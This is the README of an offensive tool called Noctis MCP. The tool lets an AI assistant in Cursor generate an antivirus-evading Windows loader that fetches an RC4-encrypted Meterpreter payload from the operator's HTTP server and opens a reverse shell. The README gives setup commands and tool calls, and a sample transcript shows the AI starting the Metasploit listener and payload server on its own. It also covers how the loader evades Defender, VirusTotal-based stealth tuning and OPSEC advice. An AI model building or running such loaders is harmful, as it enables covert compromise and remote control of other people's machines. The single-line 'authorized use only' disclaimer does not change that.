![Noctis AI](NoctisAI.png)

[![Discord](https://img.shields.io/badge/Discord-Join%20Noctis-7289DA?style=for-the-badge&logo=discord&logoColor=white)](https://discord.com/invite/bBtyAWSkW)

# NOCTIS MCP
## Automated Stageless Loader with MCP Integration

**Status:** Production Ready

---

## What It Does

**You say (in Cursor):** "Generate stageless loader for 192.168.1.56:4444"

**System delivers:**
- Working stageless loader.exe (bypasses AV)
- RC4-encrypted MSFVenom payload
- HTTP server ready to serve payload
- Metasploit listener ready to catch shell

### Complete Automated Workflow:

```
1. AI calls noctis_generate_stageless_loader(your_ip, port)
2. System generates MSFVenom payload
3. System encrypts with RC4 (polymorphic key)
4. System compiles clean loader (NO MSFVenom inside!)
5. System creates server/listener scripts
6. User runs loader on Windows → Gets Meterpreter shell
```

---

## Stageless Loader - AV Bypass

**How it bypasses signature-based AV:**
- Loader binary contains **NO MSFVenom** (clean 17KB)
- Downloads encrypted payload at runtime from your HTTP server
- Decrypts in memory with RC4
- Executes stageless Meterpreter

**Key:** Signature-based AV can't detect what isn't in the file yet.

**Note:** This system bypasses signature-based antivirus (Windows Defender). Modern EDR solutions with behavioral detection may still flag execution. For EDR bypass, additional techniques like PPID spoofing, syscall manipulation, or sleep obfuscation may be required.

**Features:**
- Bypasses Windows Defender (signature-based detection)
- Stageless download (no MSFVenom signatures)
- RC4 encryption (new key per build)
- Fully automated via MCP tools
- Cursor AI integration

**Manual Setup:** [stageless-loader/README.md](stageless-loader/README.md) | [QUICKSTART](stageless-loader/QUICKSTART.md)

---

## Quick Start

### 1. Clone Repository

```bash
git clone https://github.com/Yenn503/Noctis-MCP.git
cd Noctis-MCP
```

### 2. Install Dependencies

```bash
# Install Python requirements
pip install -r requirements.txt

# Install MinGW (for Windows cross-compilation)
# On Debian/Ubuntu/Kali:
sudo apt install mingw-w64

# On macOS:
brew install mingw-w64

# Install Metasploit Framework (for msfvenom)
# On Debian/Ubuntu/Kali:
sudo apt install metasploit-framework
# On macOS:
brew install metasploit
```

### 3. (Optional) Configure VirusTotal Testing

**Only needed if you want to test binaries for detection during development:**

```bash
# 1. Get free API key from: https://www.virustotal.com/gui/my-apikey
#    Free tier: 4 requests/min, 500/day (perfect for testing)

# 2. Copy example env file and add your key:
cp .env.example .env
nano .env  # Add: VIRUSTOTAL_API_KEY=your_key_here
```

**Skip this step if you don't need VT testing** - the system works fine without it.

### 4. Start MCP Server

```bash
./start_server.sh

# Or manually:
python3 server/noctis_server.py
```

Server starts on **http://localhost:8888**

**Server will show:**
- `[+] VirusTotal Testing: ENABLED` (if API key configured)
- `[-] VirusTotal Testing: DISABLED` (if no API key - still works fine)

### 5. Configure MCP in Cursor

Settings → Features → Model Context Protocol → Edit Config

Add this to your MCP config (update the path to match your installation):

```json
{
  "mcpServers": {
    "noctis-mcp": {
      "command": "python3",
      "args": ["-m", "noctis_mcp.noctis_tools"],
      "cwd": "/absolute/path/to/Noctis-MCP",
      "description": "Noctis Stageless Loader"
    }
  }
}
```

**Important:** Replace `/absolute/path/to/Noctis-MCP` with your actual installation path.

### 6. Use in Cursor

In Cursor, just ask:
```
"Generate stageless loader for 192.xxx.x.x:4444"
```

The AI will:
1. Call `noctis_generate_stageless_loader()`
2. Generate everything automatically
3. Start HTTP server and Metasploit listener in background
4. Provide you with the compiled loader

Then you:
1. Copy `stageless_loader.exe` to Windows VM
2. Run it
3. Get Meterpreter shell!

---

## MCP Tools (5 Available)

### 1. `noctis_generate_stageless_loader(lhost, lport, http_port, auto_start_servers=True)`
**Main tool - FULLY AUTOMATED! Does everything for you!**

```python
noctis_generate_stageless_loader("192.168.1.56", 4444, 8080)

# Automatically does:
# 1. Generates MSFVenom payload (stageless meterpreter)
# 2. Encrypts with RC4 (polymorphic key per build)
# 3. Compiles clean loader (NO MSFVenom!)
# 4. Starts HTTP server in background
# 5. Starts Metasploit listener in background
#
# You just:
# - Copy loader.exe to Windows VM
# - Run it
# - Get Meterpreter shell!
```

### 2. `noctis_check_status()`
**Check complete system status**

```python
noctis_check_status()

# Returns:
# - File status (which files exist, sizes)
# - Running services (HTTP server, MSF listener PIDs)
# - System readiness
```

### 3. `noctis_start_servers(lhost, lport, http_port)`
**Manually start HTTP server and MSF listener**

```python
noctis_start_servers("192.168.1.56", 4444, 8080)

# Starts:
# - HTTP server (serves payload.enc)
# - Metasploit listener (catches shells)
```

### 4. `noctis_stop_servers()`
**Stop all running servers**

```python
noctis_stop_servers()

# Stops:
# - HTTP server
# - Metasploit listener
```

### 5. `noctis_test_binary(file_path)` - Optional Development Tool
**Test binary against VirusTotal (70+ AV engines)**

**Configuration Required:**
```bash
# Get free API key: https://www.virustotal.com/gui/my-apikey
# Add to .env: VIRUSTOTAL_API_KEY=your_key_here
```

**WARNING:** Only use during development when improving stealth. VirusTotal shares samples with AV vendors!

```python
noctis_test_binary("/path/to/stageless_loader.exe")

# Returns detailed report:
# ======================================================================
#   VIRUSTOTAL SCAN RESULTS
# ======================================================================
# File: stageless_loader.exe
# SHA256: a1b2c3d4...
# Detection Rate: 3/72 engines
#
# [WARNING] LOW detection - Good stealth, minor flags
#
# ======================================================================
#   DETECTION BREAKDOWN BY ENGINE
# ======================================================================
# Engines that DETECTED (3):
#   [DETECTED] MicrosoftDefender    -> Trojan:Win32/Meterpreter
#   [DETECTED] AVG                  -> Generic.Malware
#   [DETECTED] Avast                -> Win32:Malware-gen
#
# Engines that passed (69):
#   [CLEAN]    CrowdStrike
#   [CLEAN]    SentinelOne
#   [CLEAN]    Sophos
#   ... and 66 more
#
# ======================================================================
#   OPSEC WARNING
# ======================================================================
# This binary is now in VirusTotal's database and shared
# with AV vendors. Do NOT reuse this exact binary.
# Recompile with new polymorphic keys before deployment.
```

**Use when:**
- Loader is getting detected, need to identify which AVs
- Testing evasion technique improvements
- Comparing different polymorphic variations

**Free API Limits:** 4 requests/min, 500/day (perfect for testing)

---

## Complete Usage Example

### In Cursor with AI:

```
YOU: Generate stageless loader for 192.168.1.56:4444

AI: I'll generate and set up everything automatically...

[AI calls: noctis_generate_stageless_loader("192.168.1.56", 4444, 8080)]

STAGELESS LOADER GENERATED!

LHOST: 192.168.1.56
LPORT: 4444
HTTP Port: 8080

Generated files:
  stageless_loader.exe (17,408 bytes) - CLEAN, NO MSFVenom!
  payload.enc (203,264 bytes) - RC4 encrypted
  start_server.sh - HTTP server script
  start_listener.sh - Metasploit listener script

STARTING SERVERS AUTOMATICALLY...

HTTP Server: RUNNING on port 8080
   Serving: http://localhost:8080/payload.enc
   PID: 12345

Metasploit Listener: RUNNING
   Listening: 192.168.1.56:4444
   Payload: windows/x64/meterpreter_reverse_tcp
   PID: 12346

READY TO TEST!

Next steps:
  1. Copy /path/to/stageless_loader.exe to Windows VM
  2. Run the loader on Windows
  3. Watch Metasploit for incoming session!

AI: Done! Everything is running. The servers are started in the background.
Just copy the loader to your Windows VM and run it!
```

---

## How It Works

### Traditional Approach (Detected)
```
[Binary with embedded MSFVenom]
    → AV scans
    → DETECTED (MSFVenom signatures)
```

### Stageless Loader (Bypasses Signature-Based AV)
```
[Clean loader.exe (17KB, NO MSFVenom)]
    → AV scans
    → CLEAN (no suspicious code)
    → Runs on Windows
    → Downloads payload.enc from your server
    → Decrypts with RC4 in memory
    → Executes stageless Meterpreter
    → Shell established!
```

**Key:** Signature-based AV can't detect what isn't in the file yet.

---

## Project Structure

```
Noctis-MCP/
├── server/
│   ├── noctis_server.py       # Flask API server (manages background processes)
│   └── __init__.py
│
├── noctis_mcp/
│   └── noctis_tools.py        # 4 MCP tools for Cursor integration
│
├── stageless-loader/          # Stageless loader system
│   ├── stageless_loader.c     # Clean loader source (NO MSFVenom)
│   ├── encrypt_payload.py     # RC4 encryption tool
│   ├── setup.sh               # Manual setup script
│   ├── README.md              # Detailed documentation
│   ├── QUICKSTART.md          # Quick start guide
│   └── .gitignore             # Ignores generated files
│
├── start_server.sh            # Start Noctis MCP server
└── README.md                  # This file
```

---

## Important Notes

### OPSEC

**DO NOT test final loader on VirusTotal** - it shares samples with AV vendors

**DO test in isolated VM environment** with Defender enabled to verify bypass

### Server Requirements

- **Metasploit Framework** for msfvenom and listener
- **MinGW-w64** for Windows cross-compilation
- **Python 3** with Flask for MCP server

### Background Processes

The system manages background processes for you:
- HTTP server serves the encrypted payload
- Metasploit listener catches incoming shells
- Both run in background with tracked PIDs

Use `noctis_stop_servers()` to cleanly shut them down.

### VirusTotal Testing (Optional)

**For development/stealth improvement only:**

When your loader starts getting detected and you need to identify which AV engines are flagging it:

```bash
# In Cursor, ask:
"Test my stageless_loader.exe against VirusTotal"

# Results show:
# - Detection rate (e.g., 3/72 engines)
# - Which specific AVs detected it
# - What signatures they flagged
# - Permalink to full report
```

**Use cases:**
- Loader getting detected, need to know which AVs
- Testing evasion technique improvements
- Comparing polymorphic variations

**OPSEC Warning:** VirusTotal shares samples with AV vendors. Only use during development. Never upload production binaries. Always recompile with new polymorphic keys after testing.

---

## Key Features

**What Makes This System Unique:**

- **Fully Automated:** One AI command does everything
- **Bypasses Signature-Based AV:** Clean loader (NO embedded MSFVenom)
- **Background Management:** HTTP + MSF servers auto-start
- **Polymorphic:** New RC4 key per build
- **Stageless:** No multi-stage download failures
- **Tested:** Working Meterpreter sessions confirmed on Windows Defender
- **VirusTotal Integration:** Test against 70+ AVs during development (optional)

**Workflow:**
1. User: "Generate stageless loader for [IP]:[PORT]"
2. AI calls MCP tool
3. System generates + compiles + starts servers
4. User copies loader to Windows
5. User runs loader → Meterpreter shell!

---

## Legal

**For authorized red team operations only.**

Never use against systems you don't own or have written permission to test.

---

**Built by:** Noctis Team
**Status:** Production Ready
**Discord:** [Join Noctis Community](https://discord.com/invite/bBtyAWSkW)
